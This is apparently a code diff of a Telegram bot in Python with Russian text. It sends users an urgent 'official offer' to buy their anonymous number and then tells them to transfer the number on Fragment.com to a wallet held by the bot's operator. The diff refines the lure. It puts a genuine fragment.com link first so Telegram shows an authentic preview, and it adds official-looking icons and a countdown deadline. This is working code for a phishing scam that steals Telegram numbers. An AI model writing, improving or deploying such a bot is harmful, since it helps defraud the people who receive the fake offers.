@@ -14,10 +14,9 @@ dispatcher = Dispatcher()
 
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
-ENVELOPE_EMOJI_ID = "6019263620142078168"
-CUSTOM_EMOJI_ID = "6023826881160157558"
 
-CUSTOM_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_EMOJI_ID}">💎</tg-emoji>'
+FRAGMENT_ICON_ID = "6014820764237171679"
+WALLET_ICON_ID = "5987635334945444280"
 
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
@@ -56,11 +55,7 @@ async def send_offer(message: Message):
         return
     
     phone_clean = phone_match.group(1)
-    if len(phone_clean) >= 10:
-        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
-    else:
-        formatted_phone = f"+{phone_clean}"
-
+    
     text_without_phone = text_clean.replace(phone_match.group(0), "")
     amount_match = re.search(r"(\d+)", text_without_phone)
     
@@ -72,10 +67,9 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # НОМЕР ТЕПЕРЬ КЛИКАБЕЛЬНАЯ ССЫЛКА (СИНИЙ)
+    # Текст, который пойдет ПОД превью
     offer_text = (
-        f"{CUSTOM_EMOJI} Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
-        f"Номер: <a href='{fragment_link}'>{formatted_phone}</a>\n\n"
+        f"Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
         f"Срок действия: <b>5ч 59м</b>\n\n"
         f"<i>Для рассмотрения предложения и запуска процедуры передачи, нажмите «Принять».</i>"
@@ -87,13 +81,13 @@ async def send_offer(message: Message):
     ]])
 
     try:
+        # Отправляем сообщение. Telegram сам подтянет картинку и заголовок из ссылки fragment.com
         await bot.send_message(
             chat_id=message.chat.id,
-            text=offer_text,
+            text=f"{fragment_link}\n\n{offer_text}", # Ссылка идет ПЕРВОЙ, чтобы Telegram сделал превью именно её
             reply_markup=keyboard,
             business_connection_id=message.business_connection_id,
             link_preview_options=LinkPreviewOptions(
-                url=fragment_link,
                 is_disabled=False,
                 prefer_large_media=True,
                 show_above_text=True
@@ -106,13 +100,14 @@ async def send_offer(message: Message):
         except:
             pass
 
+# --- ОСТАЛЬНОЙ КОД БЕЗ ИЗМЕНЕНИЙ ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
     conn_id = callback.message.business_connection_id
 
     new_text = (
         f"<b>Ожидание перевода</b>\n\n"
-        f"Переведите номер на кошелек:\n"
+        f"Переведите номер на кошелёк:\n"
         f"<code>{TON_WALLET}</code>\n\n"
         f"1. Откройте Fragment.com\n"
         f"2. Перейдите в «Мой номер»\n"
@@ -123,8 +118,8 @@ async def on_accept_offer(callback: CallbackQuery):
     )
 
     new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Открыть Fragment", url="https://fragment.com", icon_custom_emoji_id=ENVELOPE_EMOJI_ID)],
-        [InlineKeyboardButton(text="Скопировать кошелек", callback_data="copy_wallet")]
+        [InlineKeyboardButton(text="Открыть Fragment", url="https://fragment.com", icon_custom_emoji_id=FRAGMENT_ICON_ID)],
+        [InlineKeyboardButton(text="Скопировать кошелёк", callback_data="copy_wallet", icon_custom_emoji_id=WALLET_ICON_ID)]
     ])
 
     try:
@@ -150,7 +145,7 @@ async def on_decline(callback: CallbackQuery):
 
 @dispatcher.callback_query(F.data == "copy_wallet")
 async def on_copy_wallet(callback: CallbackQuery):
-    await callback.answer(f"Кошелек скопирован: {TON_WALLET}", show_alert=True)
+    await callback.answer(f"Кошелёк скопирован: {TON_WALLET}", show_alert=True)
 
 async def main():
     print("Бот запущен.")
